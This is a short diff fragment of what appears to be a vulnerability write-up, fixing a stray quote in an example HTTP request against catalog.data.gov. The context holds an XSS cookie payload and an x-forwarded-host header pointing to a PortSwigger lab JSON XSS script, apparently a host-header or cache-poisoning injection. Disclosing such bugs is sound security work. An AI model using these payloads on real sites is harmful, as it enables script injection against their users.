@@ -32,7 +32,7 @@ Cookie: gdId=xss</script%20
 **Example request:**
 ```
 GET / HTTP/2
-Host: catalog.data.gov'
+Host: catalog.data.gov
 x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php
 ```
 **Example response:**
